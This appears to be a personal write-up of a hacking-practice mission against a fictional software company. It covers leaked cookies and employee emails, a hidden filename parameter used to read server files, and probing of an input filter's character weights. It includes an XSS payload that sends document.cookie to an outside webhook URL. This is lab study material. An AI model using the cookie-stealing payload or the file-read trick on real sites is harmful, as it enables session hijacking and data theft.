The goal is to hack into the owner and pay the salary of conner.

There's a mailing list, contact us form and a demo which one can download. Which is just a useless program (tried strings but got nothing).

After login you get a username and a password (md5 hash) as well as intID which is 2 for me:
```
Set-Cookie: strUsername=r-conner%40crappysoft.com
Set-Cookie: strPassword=5b3de25c4dba60d2102281633d339b48
Set-Cookie: intID=2
```
I tried to look for SQLi in the login page but didn't manage to find any.
I'm guessing that the `intID` is the ID of the worker in the database, since conner had 2.
The PM leaks all the emails of the workers:
```html
<option value="m-crap@crappysoft.com">
  m-crap (owner) 
</option>
<option value="r-conner@crappysoft.com">
  r-conner (Sales man)
</option>
<option value="K-huibert@crappysoft.com">
  k-huibert (Sales man)
</option>
<option value="K-mercomic@crappysoft.com">
  k-mecormic (Developer)
</option>
```
So the email we're trying to reach is:
```
m-crap@crappysoft.com
```

There's also a file named:
```
GET /missions/realistic/9/files/mailinglist/addresses.txt HTTP/2
```
which is referenced secretly in `/index.php?pages=mailing`:
```html
<form action="subscribemailing.php" method="post">
  <input type="hidden" name="strFilename" value="./files/mailinglist/addresses.txt">
  <input type="text" name="strEmailAddress" value="you@somedomain.com">
  <br />
  <input type="submit" value="Subscribe!">
</form>
```
Which had:
```
peter@scholengemeenschap.nl
lisa-mele2511@school-teacher.com
k.struder@basicschoolthehorse.com
nomadschool@hotmail.com
you@somedomain.com
thomas@code920.com
y.yeng@tokiomail.tw
lamonif@hotmail.com
r-conner@crappysoft.com
iam@home.com
kleinnico@hotmail.com
lol@hi.com
kleinnico@hotmail.com
mcaster@hackermail.com
```
Again, files had directory listing.
The directory had: downloads, logs, mailinglist:
![[Pasted image 20260920172545.png]]
downloads had the demo.
logs had a file named `logs.txt` with the following contents:
```
216.239.57.99 - Login at 15:15 2003-11-5
209.73.164.91 - Bad Login at 03:40 2003-11-8
```
And mailing list had the `addresses.txt`.
In `/subscribemailing.php` when I tried to change the file to logs.txt:
```
strFilename=.%2ffiles%2flogs%2flogs.txt&strEmailAddress=a
```
I got:
```
you forgot to pay me :(
```
I noticed the cookie wasn't HTTP-Only, therefore I tried XSSing the message:
```html
<img src="https://webhook.site/0cc84bd5-801a-4d36-9dd8-9f83e38755d5" onerror="fetch('https://webhook.site/0cc84bd5-801a-4d36-9dd8-9f83e38755d5', { method: 'POST', body: document.cookie })">
```
But it didn't work as I tried it.
Something to note here is that if I supply this alone as the topic of the message it says to fill out the form:
![[Pasted image 20260920185838.png|319]]
Even though it is filled with it.
The message doesn't face the same issue.
Also, maximum message size was 149 bytes and maximum topic size is 49 bytes (probably 1 byte for null terminator). I found out it was filtering in the topic on `<>` and removing anything that is between it including the `<>`:
For example this request was not too long it's actually only 4 bytes removing the `<>`:
```
aaaa<aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb>
```
And this request was too long:
```
aaaa<>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
```
which caused me to suspect the XSS even further.
For some reason it treated different characters with different lengths.
For example for `&` I could only have up to 9 which means each one is worth `5` bytes:
```
&&&&&&&&&
```
I confirmed it by trying:
```
&&&&&&&&&aaaa = 9w(&) + 4w(a) = 45 + 4 = 49
```
For `>` I could only have 12:
```
>>>>>>>>>>>>a => w(>)=4
```
Weight map:
```
a - 1
b - 1
& - 5
> - 4
; - 1
= - 1
" - 8
 
```
I tried also XSS-ing the contact form (POST on `/index.php`) with basic `<img />` tag, which didn't work. I built a complete weight map using a python script to try and understand which letters are weighted and how much. I got:
```json
{
	"!": 1,
    "\"": 6,
    "#": 1,
    "$": 1,
    "%": 1,
    "&": 5,
    "'": 2,
    "(": 1,
    ")": 1,
    "*": 1,
    "+": 1,
    ",": 1,
    "-": 1,
    ".": 1,
    "/": 1,
    "0": 1,
    "1": 1,
    "2": 1,
    "3": 1,
    "4": 1,
    "5": 1,
    "6": 1,
    "7": 1,
    "8": 1,
    "9": 1,
    ":": 1,
    ";": 1,
    "<": null,
    "=": 1,
    ">": 4,
    "?": 1,
    "@": 1,
    "A": 1,
    "B": 1,
    ...
    "Z": 1,
    "[": 1,
    "\\": 1,
    "]": 1,
    "^": 1,
    "_": 1,
    "`": 1,
    "a": 1,
    "b": 1,
   ...
    "z": 1,
    "{": 1,
    "|": 1,
    "}": 1,
    "~": 1
}
```